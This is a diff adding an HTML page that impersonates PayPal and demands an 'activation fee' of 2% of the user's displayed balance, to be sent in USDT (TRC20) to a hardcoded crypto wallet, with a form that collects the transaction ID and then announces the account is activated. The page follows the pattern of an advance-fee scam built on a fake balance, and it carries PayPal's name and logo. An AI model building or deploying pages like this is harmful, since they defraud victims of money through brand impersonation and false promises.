@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Payment - PayPal</title>
+    <link rel="icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .payment-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .payment-amount {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .amount {
+            font-size: 2.5rem;
+            color: #0070ba;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .wallet-address {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 1.1rem;
+            text-align: center;
+            border: 2px dashed #0070ba;
+        }
+        .form-section {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .submit-btn:hover {
+            background: #005ea6;
+        }
+    </style>
+</head>
+<body>
+    <nav class="nav-main">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <img src="/assets/logo.png" alt="PayPal Logo">
+                <span>PayPal</span>
+            </div>
+            <div class="nav-menu">
+                <a href="/activation-payment" class="nav-button"><i class="fas fa-arrow-left"></i> Back to Payment Methods</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="payment-container">
+            <div class="payment-amount">
+                <h2>USDT (TRC20) Payment</h2>
+                <div class="amount" id="activationFee">Loading...</div>
+                <p>Please send the exact amount to the wallet address below.</p>
+            </div>
+
+            <div class="wallet-address">
+                <p><strong>Wallet Address (TRC20):</strong></p>
+                <p id="walletAddress">bybit"TH24TXpvXKVySBwb6XYZcW2kNoGw7XwCbx</p>
+                <p style="margin-top: 10px; font-size: 0.9rem; color: #666;">
+                    <i class="fas fa-exclamation-circle"></i> 
+                    Please ensure you are sending USDT on the TRON network (TRC20).
+                </p>
+            </div>
+
+            <form id="usdtForm" class="form-section">
+                <div class="form-group">
+                    <label for="transactionId">Transaction ID *</label>
+                    <input type="text" id="transactionId" class="form-input" required 
+                           placeholder="Enter the transaction ID from your wallet">
+                    <div style="font-size: 0.9rem; color: #666; margin-top: 5px;">
+                        After sending the USDT, enter the transaction ID (TXID) here.
+                    </div>
+                </div>
+                <button type="submit" class="submit-btn">
+                    <i class="fas fa-check-circle"></i> Confirm Payment
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Fetch activation fee
+        fetch('/api/user')
+            .then(response => response.json())
+            .then(user => {
+                const activationFee = user.balance * 0.02;
+                document.getElementById('activationFee').textContent = '$' + activationFee.toFixed(2);
+            });
+
+        // Handle form submission
+        document.getElementById('usdtForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const transactionId = document.getElementById('transactionId').value.trim();
+
+            if (!transactionId) {
+                alert('Please enter the transaction ID.');
+                return;
+            }
+
+            const submitBtn = this.querySelector('.submit-btn');
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            submitBtn.disabled = true;
+
+            // Send to server
+            fetch('/activation-payment/usdt', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    transactionId: transactionId
+                })
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.success) {
+                    alert('Payment submitted successfully! Your account is now activated.');
+                    window.location.href = '/dashboard';
+                } else {
+                    alert('Error: ' + result.error);
+                    submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Confirm Payment';
+                    submitBtn.disabled = false;
+                }
+            })
+            .catch(error => {
+                alert('An error occurred. Please try again.');
+                submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> Confirm Payment';
+                submitBtn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
